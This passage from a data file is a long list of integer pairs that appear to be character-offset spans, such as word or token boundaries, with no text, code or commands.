14299], [14300, 14304], [14305, 14311], [14312, 14321], [14322, 14323], [14323, 14324], [14324, 14325], [14325, 14327], [14328, 14332], [14332, 14333], [14334, 14339], [14340, 14342], [14343, 14347], [14348, 14356], [14357, 14361], [14362, 14368], [14369, 14376], [14377, 14381], [14381, 14382], [14383, 14386], [14387, 14396], [14397, 14407], [14408, 14411], [14412, 14414], [14415, 14426], [14427, 14430], [14431, 14439], [14440, 14447], [14448, 14457], [14458, 14461], [14462, 14468], [14469, 14480], [14481, 14483], [14484, 14486], [14487, 14496], [14497, 14499], [14500, 14503], [14504, 14510], [14511, 14517], [14517, 14518], [14519, 14523], [14524, 14526], [14527, 14532], [14533, 14535], [14536, 14545], [14546, 14553], [14553, 14554], [14555, 14561], [14562, 14568], [14569, 14573], [14574, 14583], [14584, 14594], [14595, 14599], [14600, 14605], [14606, 14612], [14613, 14622], [14623, 14627], [14628, 14630], [14631, 14642], [14643, 14645], [14646, 14652], [14652, 14653], [14654, 14665], [14665, 14666], [14667, 14673], [14674, 14682], [14683, 14687], [14688, 14690], [14691, 14699], [14700, 14706], [14707, 14716], [14717, 14718], [14718, 14719], [14719, 14720], [14720, 14722], [14723, 14727], [14727, 14728], [14729, 14734], [14735, 14738], [14739, 14745], [14746, 14748], [14749, 14757], [14758, 14769], [14770, 14778], [14779, 14781], [14782, 14793], [14794, 14800], [14801, 14805], [14805, 14806], [14807, 14811], [14812, 14815], [14816, 14818], [14819, 14831], [14832, 14835], [14836, 14843], [14844, 14851], [14852, 14855], [14856, 14860], [14861, 14866], [14867, 14876], [14877, 14881], [14882, 14884], [14885, 14892], [14893, 14897], [14898, 14909], [14910, 14913], [14914, 14921], [14921, 14922], [14923, 14930], [14931, 14943], [14943, 14944], [14945, 14947], [14948, 14957], [14958, 14964], [14965, 14969], [14970, 14974], [14975, 14985], [14986, 14997], [14997, 14998], [14999, 15005], [15006, 15014], [15015, 15025], [15026, 15029], [15030, 15034], [15035, 15038], [15039, 15042], [15043, 15049], [15050, 15056], [15057, 15059], [15060, 15064], [15065, 15066], [15067, 15073], [15074, 15085], [15086, 15095], [15095, 15096], [15097, 15101], [15102, 15105], [15106, 15110], [15111, 15114], [15115, 15122], [15123, 15135], [15136, 15142], [15143, 15146], [15147, 15151], [15152, 15159], [15160, 15162], [15163, 15171], [15172, 15178], [15179, 15187], [15188, 15190], [15191, 15205], [15205, 15206], [15207, 15211], [15212, 15222], [15222, 15223], [15224, 15230], [15231, 15239], [15240, 15247], [15248, 15255], [15256, 15268], [15269, 15279], [15280, 15283], [15284, 15295], [15296, 15306], [15307, 15313], [15314, 15317], [15318, 15329], [15330, 15337], [15337, 15338], [15339, 15343], [15344, 15347], [15348, 15352], [15353, 15356], [15357, 15366], [15367, 15377], [15378, 15382], [15383, 15394], [15395, 15397], [15398, 15414], [15415, 15418], [15419, 15426], [15426, 15427], [15428, 15434], [15435, 15437], [15438, 15443], [15444, 15449], [15450, 15452], [15453, 15463], [15464, 15467], [15468, 15471], [15472, 15479], [15479, 15480], [15481, 15490], [15491, 15498], [15498, 15499], [15500, 15502], [15503, 15509], [15510, 15518], [15519, 15528], [15529, 15535], [15536, 15543], [15544, 15548], [15548, 15549], [15550, 15552], [15553, 15556], [15557, 15568], [15569, 15574], [15575, 15582], [15583, 15598], [15599, 15608], [15609, 15616], [15617, 15621], [15622, 15624], [15625, 15633], [15634, 15639], [15640, 15644], [15645, 15654], [15655, 15660], [15661, 15663], [15664, 15673], [15674, 15685], [15686, 15692], [15693, 15700], [15700, 15701], [15702, 15706], [15707, 15710], [15711, 15716], [15717, 15718], [15719, 15726], [15727, 15736], [15737, 15739], [15740, 15747], [15748, 15757], [15758, 15760], [15761, 15765], [15766, 15775], [15776, 15778], [15779, 15787], [15788, 15797], [15797, 15798], [15800, 15812], [15813, 15816], [15817, 15828], [15829, 15831], [15832, 15847], [15847, 15848], [15849, 15855], [15856, 15858], [15859, 15862], [15863, 15870], [15871, 15877], [15878, 15884], [15885, 15887], [15888, 15894], [15895, 15907], [15908, 15917], [15918, 15936], [15936, 15937], [15937, 15939], [15940, 15943], [15944, 15949], [15950, 15958], [15959, 15961], [15962, 15966], [15967, 15969], [15970, 15975], [15976, 15978], [15979, 15981], [15981, 15982], [15983, 15985], [15986, 15989], [15990, 15997], [15998, 16000], [16001, 16005], [16006, 16010], [16011, 16016], [16017, 16020], [16021, 16029], [16030, 16032], [16033, 16040], [16041, 16049], [16049, 16050], [16051, 16059], [16060, 16064], [16065, 16068], [16069, 16077], [16077, 16078], [16079, 16088], [16089, 16094], [16095, 16105], [16106, 16109], [16110, 16120], [16121, 16126], [16127, 16130], [16131, 16138], [16138, 16139], [16140, 16144], [16145, 16149], [16150, 16155], [16156, 16158], [16159, 16161], [16162, 16170], [16171, 16174], [16175, 16188], [16189, 16191], [16192, 16195], [16196, 16203], [16204, 16206], [16207, 16214], [16215, 16218], [16219, 16228], [16229, 16237], [16238, 16249], [16250, 16252], [16253, 16260], [16261, 16269], [16269, 16270], [16271, 16275], [16276, 16277], [16278, 16280], [16281, 16284], [16285, 16292], [16293, 16295], [16296, 16304], [16305, 16312], [16313, 16323], [16324, 16328], [16329, 16331], [16332, 16339], [16339, 16340], [16341, 16348], [16348, 16349], [16350, 16353], [16354, 16362], [16362, 16363], [16364, 16367], [16368, 16377], [16378, 16389], [16390, 16398], [16399, 16406], [16407, 16415], [16416, 16423], [16424, 16431], [16432, 16434], [16435, 16442], [16443, 16454], [16455, 16462], [16462, 16463], [16464, 16469], [16470, 16473], [16474, 16476], [16477, 16487], [16488, 16491], [16492, 16495], [16496, 16497], [16498, 16503], [16504, 16508], [16509, 16516], [16517, 16521], [16522, 16526], [16527, 16529], [16530, 16534], [16535, 16538], [16539, 16546], [16547, 16553], [16553, 16554], [16555, 16559], [16560, 16566], [16567, 16569], [16570, 16575], [16576, 16578], [16579, 16588], [16589, 16592], [16593, 16596], [16597, 16599], [16600, 16603], [16604, 16610], [16611, 16619], [16619, 16620], [16621, 16632], [16633, 16637], [16638, 16645], [16645, 16646], [16647, 16648], [16649, 16657], [16658, 16662], [16663, 16665], [16666, 16672], [16673, 16681], [16682, 16695], [16696, 16698], [16699, 16702], [16703, 16709], [16710, 16718], [16719, 16723], [16723, 16724], [16725, 16727], [16728, 16733], [16734, 16745], [16746, 16753], [16754, 16758], [16759, 16762], [16763, 16764], [16764, 16769], [16770, 16780], [16780, 16781], [16782, 16793], [16793, 16794], [16795, 16802], [16802, 16803], [16804, 16806], [16807, 16809], [16810, 16817], [16818, 16820], [16821, 16829], [16830, 16834], [16835, 16839], [16840, 16848], [16849, 16857], [16858, 16859], [16860, 16864], [16865, 16878], [16879, 16881], [16882, 16886], [16887, 16894], [16895, 16904], [16905, 16915], [16916, 16924], [16925, 16927], [16928, 16939], [16939, 16940], [16941, 16943], [16944, 16948], [16949, 16956], [16957, 16967], [16968, 16976], [16977, 16980], [16981, 16991], [16992, 16994], [16995, 17004], [17005, 17017], [17018, 17024], [17024, 17025], [17026, 17030], [17031, 17035], [17036, 17041], [17042, 17044], [17045, 17048], [17049, 17062], [17063, 17066], [17067, 17074], [17075, 17084], [17084, 17085], [17086, 17090], [17091, 17096], [17097, 17103], [17104, 17106], [17107, 17114], [17115, 17122], [17122, 17123], [17124, 17126], [17127, 17133], [17134, 17136], [17137, 17142], [17143, 17149], [17150, 17152], [17153, 17156], [17157, 17162], [17163, 17165], [17166, 17170], [17171, 17178], [17179, 17190], [17190, 17191], [17192, 17200], [17201, 17204], [17205, 17212], [17213, 17224], [17225, 17230], [17231, 17235], [17236, 17238], [17239, 17250], [17251, 17260], [17261, 17265], [17266, 17268], [17269, 17270], [17271, 17274], [17275, 17276], [17276, 17278], [17279, 17281], [17282, 17287], [17288, 17293], [17294, 17303], [17304, 17313], [17314, 17316], [17317, 17318], [17319, 17324], [17325, 17330], [17330, 17331], [17332, 17337], [17338, 17350], [17351, 17360], [17361, 17365], [17366, 17372], [17373, 17378], [17379, 17383], [17384, 17386], [17387, 17390], [17391, 17394], [17395, 17400], [17401, 17412], [17412, 17413], [17414, 17417], [17418, 17423], [17424, 17427], [17428, 17435], [17436, 17444], [17445, 17447], [17448, 17459], [17460, 17469], [17470, 17473], [17474, 17483], [17484, 17486], [17487, 17490], [17491, 17496], [17497, 17499], [17500, 17513], [17514, 17521], [17521, 17522], [17523, 17526], [17527, 17529], [17530, 17533], [17534, 17541], [17542, 17549], [17550, 17553], [17554, 17562], [17563, 17564], [17565, 17568], [17569, 17570], [17570, 17572], [17573, 17575], [17576, 17579], [17580, 17585], [17586, 17588], [17589, 17596], [17597, 17601], [17602, 17609], [17610, 17614], [17615, 17621], [17622, 17631], [17632, 17635], [17636, 17644], [17644, 17645], [17646, 17651], [17652, 17661], [17662, 17667], [17668, 17674], [17675, 17681], [17682, 17694], [17694, 17695], [17696, 17702], [17703, 17705], [17706, 17712], [17713, 17717], [17717, 17718], [17719, 17722], [17723, 17726], [17727, 17734], [17735, 17737], [17738, 17743], [17744, 17753], [17754, 17757], [17758, 17767], [17768, 17772], [17772, 17773], [17774, 17778], [17779, 17784], [17785, 17787], [17788, 17795], [17796, 17803], [17804, 17811], [17812, 17822], [17823, 17825], [17826, 17832], [17833, 17841], [17841, 17842], [17843, 17850], [17850, 17851], [17852, 17855], [17856, 17864], [17865, 17874], [17875, 17890], [17891, 17895], [17896, 17899], [17900, 17905], [17906, 17915], [17916, 17919], [17920, 17927], [17928, 17943], [17944, 17946], [17947, 17950], [17951, 17959], [17960, 17971], [17971, 17972], [17973, 17980], [17981, 17989], [17990, 17991], [17991, 17994], [17994, 17995], [17996, 18007], [18008, 18010], [18011, 18012], [18013, 18017], [18018, 18022], [18023, 18029], [18030, 18032], [18033, 18036], [18037, 18042], [18043, 18048], [18049, 18051], [18052, 18055], [18056, 18060], [18061, 18066], [18067, 18070], [18071, 18073], [18074, 18076], [18077, 18088], [18089, 18091], [18092, 18095], [18096, 18101], [18102, 18114], [18115, 18124], [18125, 18130], [18131, 18139], [18140, 18151], [18152, 18158], [18159, 18161], [18162, 18165], [18166, 18171], [18172, 18178], [18179, 18188], [18188, 18189], [18190, 18198], [18199, 18211], [18212, 18219], [18220, 18222], [18223, 18231], [18232, 18238], [18239, 18247], [18247, 18248], [18249, 18264], [18265, 18268], [18269, 18275], [18276, 18282], [18283, 18287], [18288, 18299], [18299, 18300], [18301, 18309], [18310, 18318], [18319, 18328], [18329, 18334], [18334, 18335], [18336, 18339], [18340, 18347], [18348, 18358], [18358, 18359], [18360, 18363], [18364, 18368], [18369, 18371], [18372, 18374], [18375, 18381], [18382, 18385], [18386, 18393], [18394, 18397], [18398, 18403], [18404, 18411], [18412, 18414], [18415, 18418], [18419, 18425], [18426, 18435], [18436, 18438], [18439, 18442], [18443, 18454], [18454, 18455], [18456, 18463], [18464, 18469], [18470, 18473], [18474, 18483], [18484, 18486], [18487, 18493], [18494, 18496], [18497, 18504], [18505, 18512], [18512, 18513], [18514, 18518], [18519, 18521], [18522, 18523], [18524, 18539], [18540, 18547], [18548, 18549], [18549, 18552], [18552, 18554], [18555, 18556], [18557, 18564], [18565, 18574], [18575, 18579], [18580, 18586], [18587, 18589], [18590, 18598], [18599, 18609], [18610, 18616], [18617, 18618], [18618, 18621], [18621, 18622], [18623, 18629], [18630, 18632], [18633, 18636], [18637, 18640], [18641, 18643], [18644, 18647], [18648, 18653], [18654, 18658], [18659, 18669], [18670, 18677], [18677, 18678], [18679, 18687], [18688, 18693], [18694, 18698], [18699, 18704], [18705, 18707], [18708, 18713], [18714, 18719], [18719, 18720], [18721, 18726], [18727, 18732], [18733, 18737], [18738, 18742], [18743, 18747], [18748, 18750], [18751, 18753], [18754, 18760], [18761, 18767], [18768, 18770], [18771, 18776], [18777, 18779], [18780, 18784], [18784, 18785], [18786, 18789], [18790, 18797], [18797, 18798], [18799, 18802], [18803, 18806], [18807, 18812], [18813, 18822], [18823, 18826], [18827, 18830], [18831, 18834], [18835, 18840], [18841, 18843], [18844, 18848], [18848, 18849], [18850, 18859], [18860, 18861], [18862, 18870], [18871, 18875], [18876, 18883], [18884, 18886], [18887, 18893], [18894, 18898], [18899, 18906], [18907, 18920], [18921, 18923], [18924, 18931], [18931, 18932], [18933, 18942], [18943, 18946], [18947, 18952], [18953, 18956], [18957, 18962], [18963, 18965], [18966, 18974], [18975, 18982], [18983, 18985], [18986, 18991], [18992, 19001], [19002, 19007], [19008, 19010], [19011, 19021], [19022, 19032], [19033, 19039], [19040, 19044], [19044, 19045], [19046, 19050], [19051, 19053], [19054, 19064], [19064, 19065], [19066, 19069], [19070, 19078], [19078, 19079], [19080, 19084], [19085, 19087], [19088, 19089], [19090, 19100], [19101, 19110], [19111, 19115], [19116, 19119], [19120, 19122], [19123, 19127], [19128, 19130], [19131, 19139], [19140, 19143], [19144, 19151], [19152, 19153], [19154, 19160], [19161, 19162], [19162, 19165], [19166, 19168], [19169, 19170], [19170, 19173], [19174, 19178], [19178, 19179], [19180, 19190], [19191, 19192], [19192, 19195], [19195, 19196], [19196, 19206], [19207, 19210], [19210, 19211], [19211, 19220], [19220, 19222], [19222, 19236], [19236, 19238], [19238, 19242], [19242, 19245], [19245, 19247], [19247, 19248], [19248, 19252], [19252, 19253], [19253, 19262], [19262, 19263], [19263, 19266], [19266, 19269], [19270, 19273], [19274, 19275], [19275, 19278], [19279, 19283], [19284, 19289], [19290, 19292], [19293, 19294], [19295, 19301], [19302, 19308], [19309, 19317], [19318, 19320], [19321, 19323], [19324, 19325], [19325, 19328], [19329, 19333], [19334, 19337], [19338, 19341], [19342, 19351], [19351, 19352], [19353, 19357], [19358, 19360], [19361, 19362], [19363, 19369], [19370, 19379], [19380, 19384], [19385, 19388], [19389, 19393], [19394, 19398], [19399, 19402], [19403, 19408], [19408, 19409], [19410, 19419], [19420, 19422], [19423, 19426], [19427, 19434], [19435, 19442], [19443, 19447], [19448, 19452], [19453, 19458], [19459, 19468], [19469, 19471], [19472, 19476], [19476, 19477], [19478, 19482], [19483, 19485], [19486, 19495], [19496, 19505], [19506, 19513], [19514, 19516], [19517, 19525], [19526, 19527], [19528, 19539], [19540, 19547], [19548, 19550], [19551, 19558], [19558, 19559], [19560, 19565], [19566, 19568], [19569, 19571], [19572, 19585], [19586, 19592], [19593, 19604], [19605, 19610], [19611, 19614], [19615, 19623], [19624, 19630], [19631, 19633], [19634, 19637], [19638, 19641], [19642, 19646], [19646, 19647], [19648, 19651], [19652, 19653], [19653, 19656], [19657, 19661], [19662, 19665], [19666, 19670], [19671, 19673], [19674, 19675], [19676, 19683], [19684, 19690], [19691, 19695], [19696, 19699], [19700, 19704], [19705, 19712], [19713, 19724], [19725, 19729], [19730, 19734], [19735, 19750], [19750, 19751], [19752, 19756], [19757, 19766], [19767, 19769], [19770, 19774], [19775, 19782], [19783, 19785], [19786, 19795], [19796, 19799], [19800, 19806], [19807, 19809], [19810, 19813], [19814, 19817], [19818, 19822], [19822, 19823], [19824, 19826], [19827, 19831], [19832, 19836], [19836, 19837], [19838, 19841], [19842, 19852], [19853, 19862], [19863, 19867], [19868, 19872], [19872, 19873], [19874, 19881], [19881, 19882], [19883, 19886], [19887, 19894], [19895, 19899], [19900, 19908], [19909, 19911], [19912, 19915], [19916, 19924], [19925, 19929], [19929, 19930], [19931, 19937], [19937, 19938], [19939, 19943], [19944, 19948], [19949, 19952], [19953, 19954], [19955, 19961], [19962, 19964], [19965, 19974], [19975, 19979], [19980, 19983], [19984, 19990], [19991, 19993], [19994, 20002], [20003, 20006], [20007, 20012], [20013, 20020], [20021, 20027], [20028, 20031], [20032, 20040], [20041, 20049], [20049, 20050], [20052, 20054], [20055, 20060], [20061, 20063], [20064, 20072], [20073, 20075], [20076, 20081], [20082, 20086], [20087, 20091], [20092, 20096], [20097, 20099], [20100, 20109], [20110, 20116], [20117, 20122], [20123, 20129], [20129, 20130], [20131, 20136], [20137, 20145], [20145, 20146], [20147, 20150], [20151, 20155], [20155, 20156], [20157, 20160], [20161, 20165], [20166, 20167], [20168, 20174], [20175, 20177], [20178, 20182], [20183, 20189], [20190, 20195], [20196, 20202], [20203, 20206], [20207, 20208], [20208, 20211], [20212, 20218], [20218, 20219], [20220, 20222], [20223, 20227], [20228, 20230], [20231, 20237], [20238, 20241], [20242, 20244], [20245, 20249], [20250, 20255], [20256, 20261], [20261, 20262], [20263, 20268], [20269, 20279], [20279, 20280], [20280, 20283], [20283, 20284], [20285, 20289], [20290, 20292], [20293, 20294], [20294, 20307], [20307, 20308], [20309, 20310], [20310, 20311], [20312, 20314], [20315, 20316], [20316, 20324], [20324, 20325], [20326, 20327], [20327, 20328], [20329, 20342], [20343, 20345], [20345, 20357], [20357, 20358], [20358, 20361], [20362, 20367], [20367, 20370], [20370, 20380], [20380, 20381], [20381, 20384], [20384, 20385], [20385, 20398], [20399, 20405], [20405, 20406], [20407, 20412], [20412, 20415], [20415, 20425], [20425, 20426], [20426, 20429], [20429, 20430], [20430, 20438], [20438, 20439], [20439, 20452], [20453, 20458], [20459, 20462], [20463, 20471], [20472, 20475], [20476, 20480], [20481, 20485], [20486, 20488], [20489, 20496], [20497, 20500], [20501, 20505], [20506, 20510], [20511, 20518], [20519, 20520], [20521, 20524], [20525, 20530], [20530, 20531], [20532, 20534], [20535, 20538], [20539, 20545], [20546, 20550], [20551, 20554], [20555, 20559], [20560, 20564], [20565, 20568], [20569, 20573], [20574, 20576], [20577, 20583], [20583, 20584], [20585, 20596], [20597, 20603], [20604, 20605], [20606, 20613], [20615, 20620], [20621, 20622], [20623, 20633], [20634, 20640], [20640, 20641], [20641, 20644], [20644, 20645], [20645, 20654], [20655, 20659], [20660, 20661], [20662, 20663], [20663, 20668], [20668, 20671], [20671, 20681], [20681, 20682], [20682, 20685], [20685, 20686], [20686, 20693], [20693, 20694], [20694, 20707], [20707, 20708], [20709, 20714], [20715, 20716], [20717, 20724], [20724, 20725], [20725, 20727], [20727, 20728], [20728, 20733], [20733, 20735], [20735, 20742], [20742, 20744], [20744, 20750], [20750, 20751], [20751, 20753], [20753, 20754], [20754, 20759], [20759, 20761], [20761, 20772], [20772, 20775], [20776, 20777], [20777, 20790], [20790, 20791], [20791, 20794], [20794, 20796], [20797, 20802], [20802, 20803], [20803, 20815], [20815, 20816], [20816, 20820], [20820, 20821], [20822, 20827], [20827, 20828], [20829, 20834], [20835, 20836], [20837, 20847], [20848, 20858], [20859, 20864], [20864, 20865], [20865, 20876], [20877, 20882], [20882, 20883], [20883, 20895], [20895, 20896], [20896, 20901], [20901, 20902], [20903, 20907], [20908, 20910], [20911, 20919], [20920, 20930], [20931, 20937], [20938, 20942], [20943, 20952], [20953, 20954], [20955, 20959], [20960, 20964], [20965, 20966], [20967, 20972], [20973, 20981], [20982, 20985], [20986, 20994], [20995, 20997], [20997, 20998], [20999, 21005], [21006, 21010], [21011, 21015], [21016, 21020], [21021, 21025], [21025, 21026], [21027, 21032], [21033, 21034], [21035, 21045], [21046, 21052], [21052, 21053], [21053, 21056], [21056, 21057], [21057, 21066], [21067, 21071], [21072, 21076], [21077, 21084], [21085, 21086], [21087, 21090], [21091, 21100], [21101, 21107], [21108, 21111], [21112, 21119], [21120, 21122], [21123, 21125], [21126, 21129], [21130, 21138], [21139, 21144], [21144, 21145], [21146, 21149], [21150, 21159], [21160, 21165], [21166, 21174], [21175, 21181], [21182, 21189], [21190, 21193], [21194, 21201], [21202, 21206], [21207, 21209], [21210, 21213], [21214, 21223], [21224, 21228], [21229, 21233], [21234, 21235], [21236, 21244], [21245, 21255], [21256, 21258], [21259, 21260], [21261, 21264], [21264, 21265], [21266, 21270], [21271, 21272], [21273, 21274], [21274, 21279], [21279, 21282], [21282, 21292], [21292, 21293], [21293, 21296], [21296, 21297], [21297, 21304], [21304, 21305], [21305, 21318], [21318, 21319], [21320, 21324], [21325, 21329], [21330, 21334], [21335, 21338], [21339, 21344], [21345, 21347], [21348, 21351], [21352, 21356], [21357, 21365], [21366, 21368], [21369, 21372], [21373, 21376], [21377, 21379], [21380, 21383], [21384, 21388], [21389, 21391], [21392, 21394], [21395, 21405], [21405, 21406], [21407, 21412], [21413, 21414], [21415, 21422], [21422, 21423], [21423, 21425], [21425, 21426], [21426, 21431], [21431, 21433], [21433, 21440], [21440, 21442], [21442, 21448], [21448, 21449], [21449, 21451], [21451, 21452], [21452, 21457], [21457, 21459], [21459, 21470], [21470, 21473], [21474, 21475], [21475, 21488], [21488, 21489], [21489, 21492], [21492, 21494], [21495, 21499], [21500, 21504], [21505, 21509], [21510, 21513], [21514, 21521], [21522, 21528], [21529, 21531], [21532, 21535], [21536, 21540], [21541, 21546], [21547, 21549], [21550, 21557], [21558, 21561], [21562, 21571], [21572, 21578], [21579, 21583], [21584, 21585], [21585, 21594], [21595, 21600], [21601, 21604], [21605, 21616], [21617, 21623], [21623, 21624], [21625, 21629], [21630, 21633], [21634, 21638], [21639, 21643], [21644, 21658], [21658, 21659], [21659, 21663], [21663, 21664], [21665, 21668], [21669, 21678], [21679, 21683], [21684, 21686], [21687, 21695], [21696, 21698], [21699, 21702], [21703, 21708], [21709, 21717], [21717, 21718], [21719, 21724], [21724, 21725], [21725, 21737], [21737, 21738], [21738, 21742], [21742, 21743], [21744, 21749], [21749, 21750], [21751, 21755], [21756, 21760], [21761, 21765], [21766, 21769], [21770, 21782], [21783, 21789], [21790, 21792], [21793, 21796], [21797, 21806], [21807, 21813], [21814, 21816], [21817, 21825], [21826, 21829], [21830, 21834], [21835, 21839], [21840, 21843], [21844, 21853], [21854, 21857], [21858, 21861], [21862, 21866], [21867, 21869], [21870, 21872], [21873, 21876], [21877, 21886], [21887, 21892], [21893, 21897], [21898, 21902], [21902, 21903], [21904, 21909], [21910, 21911], [21912, 21922], [21923, 21933], [21934, 21939], [21939, 21940], [21940, 21951], [21952, 21956], [21957, 21961], [21962, 21969], [21970, 21971], [21972, 21975], [21976, 21981], [21981, 21982], [21982, 21993], [21994, 21997], [21998, 22004], [22005, 22008], [22009, 22016], [22017, 22019], [22020, 22022], [22023, 22026], [22027, 22032], [22033, 22041], [22041, 22042], [22043, 22046], [22047, 22052], [22052, 22053], [22053, 22064], [22065, 22071], [22072, 22080], [22081, 22088], [22089, 22092], [22093, 22100], [22101, 22105], [22106, 22109], [22110, 22117], [22118, 22123], [22123, 22124], [22125, 22130], [22130, 22131], [22131, 22143], [22143, 22144], [22144, 22149], [22149, 22150], [22151, 22155], [22156, 22160], [22161, 22165], [22166, 22169], [22170, 22182], [22183, 22189], [22190, 22192], [22193, 22196], [22197, 22202], [22202, 22203], [22203, 22214], [22215, 22221], [22222, 22224], [22225, 22232], [22233, 22236], [22237, 22247], [22248, 22252], [22252, 22253], [22255, 22258], [22259, 22261], [22262, 22266], [22267, 22271], [22271, 22272], [22273, 22277], [22278, 22287], [22288, 22290], [22291, 22295], [22296, 22300], [22301, 22303], [22304, 22308], [22309, 22319], [22320, 22330], [22331, 22334], [22335, 22347], [22348, 22357], [22358, 22360], [22361, 22362], [22363, 22371], [22372, 22376], [22377, 22385], [22385, 22386], [22387, 22389], [22390, 22398], [22399, 22401], [22402, 22405], [22406, 22414], [22415, 22428], [22428, 22429], [22430, 22432], [22433, 22436], [22437, 22440], [22441, 22443], [22444, 22448], [22449, 22454], [22455, 22457], [22458, 22463], [22464, 22471], [22472, 22474], [22475, 22482], [22483, 22486], [22487, 22493], [22494, 22499], [22500, 22503], [22504, 22511], [22512, 22522], [22522, 22523], [22524, 22532], [22533, 22534], [22535, 22538], [22539, 22544], [22545, 22547], [22548, 22556], [22556, 22557], [22558, 22568], [22569, 22573], [22574, 22577], [22578, 22582], [22583, 22585], [22586, 22588], [22589, 22595], [22596, 22605], [22606, 22608], [22609, 22612], [22613, 22619], [22619, 22620], [22621, 22626], [22627, 22634], [22635, 22636], [22637, 22640], [22641, 22646], [22647, 22659], [22659, 22660], [22660, 22663], [22664, 22666], [22667, 22671], [22672, 22677], [22678, 22682], [22683, 22689], [22690, 22692], [22693, 22694], [22695, 22701], [22702, 22704], [22705, 22708], [22709, 22712], [22713, 22718], [22719, 22722], [22723, 22731], [22732, 22740], [22741, 22752], [22753, 22756], [22757, 22767], [22768, 22771], [22772, 22780], [22781, 22789], [22789, 22790], [22791, 22802], [22803, 22809], [22810, 22814], [22815, 22822], [22823, 22828], [22829, 22830], [22831, 22841], [22842, 22848], [22848, 22849], [22849, 22852], [22852, 22853], [22853, 22862], [22863, 22867], [22868, 22869], [22870, 22871], [22871, 22876], [22876, 22879], [22879, 22889], [22889, 22890], [22890, 22893], [22893, 22894], [22894, 22901], [22901, 22902], [22902, 22915], [22915, 22916], [22917, 22922], [22923, 22924], [22925, 22932], [22932, 22933], [22933, 22935], [22935, 22936], [22936, 22941], [22941, 22943], [22943, 22950], [22950, 22952], [22952, 22958], [22958, 22959], [22959, 22961], [22961, 22962], [22962, 22967], [22967, 22969], [22969, 22980], [22980, 22983], [22984, 22985], [22985, 22998], [22998, 22999], [22999, 23002], [23002, 23004], [23006, 23014], [23015, 23016], [23017, 23024], [23024, 23025], [23025, 23028], [23028, 23029], [23029, 23040], [23040, 23042], [23042, 23048], [23048, 23049], [23049, 23053], [23053, 23054], [23055, 23063], [23063, 23064], [23064, 23070], [23071, 23072], [23073, 23074], [23074, 23078], [23078, 23079], [23080, 23089], [23090, 23091], [23092, 23097], [23099, 23102], [23103, 23104], [23109, 23118], [23119, 23120], [23121, 23129], [23129, 23130], [23130, 23141], [23141, 23143], [23148, 23159], [23160, 23161], [23162, 23167], [23167, 23176], [23176, 23177], [23177, 23187], [23193, 23195], [23196, 23197], [23197, 23208], [23209, 23212], [23213, 23216], [23216, 23217], [23218, 23219], [23228, 23229], [23230, 23240], [23241, 23249], [23250, 23254], [23255, 23259], [23260, 23266], [23267, 23271], [23272, 23275], [23284, 23289], [23289, 23290], [23290, 23302], [23302, 23303], [23303, 23307], [23307, 23308], [23309, 23314], [23314, 23315], [23318, 23323], [23324, 23325], [23326, 23336], [23337, 23347], [23348, 23353], [23353, 23354], [23354, 23365], [23368, 23373], [23373, 23374], [23374, 23386], [23386, 23387], [23387, 23392], [23392, 23393], [23398, 23399], [23400, 23401], [23402, 23407], [23408, 23415], [23415, 23416], [23416, 23419], [23419, 23420], [23420, 23433], [23434, 23435], [23440, 23451], [23452, 23453], [23454, 23459], [23459, 23461], [23461, 23462], [23462, 23471], [23471, 23472], [23472, 23480], [23480, 23481], [23481, 23491], [23497, 23499], [23500, 23501], [23501, 23512], [23513, 23516], [23517, 23520], [23520, 23521], [23522, 23523], [23532, 23533], [23534, 23538], [23539, 23542], [23543, 23548], [23548, 23549], [23550, 23554], [23555, 23556], [23557, 23560], [23561, 23568], [23569, 23571], [23572, 23573], [23574, 23579], [23580, 23583], [23584, 23593], [23594, 23596], [23597, 23609], [23609, 23610], [23610, 23613], [23622, 23631], [23632, 23633], [23634, 23635], [23635, 23639], [23639, 23642], [23642, 23654], [23654, 23655], [23655, 23658], [23658, 23659], [23659, 23667], [23667, 23668], [23668, 23673], [23673, 23674], [23674, 23684], [23684, 23685], [23685, 23691], [23691, 23692], [23692, 23696], [23696, 23697], [23706, 23715], [23716, 23717], [23718, 23723], [23723, 23724], [23724, 23738], [23738, 23739], [23739, 23748], [23748, 23749], [23754, 23755], [23756, 23760], [23761, 23762], [23771, 23776], [23781, 23782], [23783, 23784], [23785, 23787], [23788, 23800], [23801, 23802], [23803, 23808], [23809, 23814], [23815, 23823], [23824, 23833], [23834, 23836], [23837, 23840], [23841, 23848], [23849, 23852], [23853, 23861], [23862, 23872], [23873, 23885], [23885, 23886], [23887, 23891], [23892, 23901], [23902, 23903], [23904, 23907], [23908, 23916], [23917, 23921], [23922, 23923], [23924, 23932], [23933, 23936], [23936, 23937], [23938, 23940], [23941, 23944], [23945, 23952], [23953, 23954], [23955, 23965], [23966, 23969], [23970, 23977], [23978, 23980], [23981, 23982], [23983, 23988], [23989, 23992], [23993, 24002], [24003, 24005], [24006, 24018], [24018, 24019], [24019, 24022], [24022, 24023], [24024, 24028], [24029, 24035], [24036, 24040], [24041, 24044], [24045, 24052], [24053, 24057], [24058, 24059], [24059, 24070], [24071, 24075], [24076, 24085], [24085, 24087], [24088, 24097], [24098, 24100], [24101, 24110], [24111, 24113], [24114, 24121], [24122, 24131], [24131, 24132], [24133, 24140], [24140, 24141], [24142, 24144], [24145, 24148], [24149, 24151], [24152, 24157], [24158, 24163], [24164, 24166], [24167, 24177], [24178, 24181], [24182, 24191], [24192, 24195], [24196, 24203], [24204, 24212], [24212, 24213], [24214, 24216], [24217, 24221], [24222, 24227], [24228, 24232], [24233, 24244], [24245, 24255], [24256, 24261], [24262, 24263], [24264, 24271], [24272, 24276], [24277, 24281], [24282, 24291], [24291, 24292], [24293, 24298], [24298, 24301], [24301, 24307], [24307, 24308], [24308, 24311], [24311, 24312], [24312, 24321], [24321, 24322], [24322, 24331], [24332, 24336], [24337, 24341], [24342, 24345], [24346, 24350], [24351, 24360], [24361, 24363], [24364, 24365], [24366, 24372], [24373, 24377], [24378, 24380], [24381, 24384], [24385, 24392], [24393, 24400], [24400, 24401], [24402, 24404], [24405, 24415], [24415, 24416], [24417, 24419], [24420, 24424], [24424, 24425], [24426, 24428], [24429, 24433], [24434, 24440], [24441, 24444], [24445, 24449], [24450, 24460], [24461, 24463], [24464, 24469], [24470, 24476], [24477, 24486], [24487, 24497], [24497, 24498], [24499, 24503], [24503, 24504], [24505, 24512], [24513, 24521], [24521, 24522], [24522, 24534], [24535, 24541], [24542, 24554], [24555, 24556], [24556, 24565], [24565, 24566], [24567, 24576], [24576, 24577], [24578, 24588], [24588, 24589], [24590, 24598], [24599, 24612], [24613, 24624], [24625, 24638], [24639, 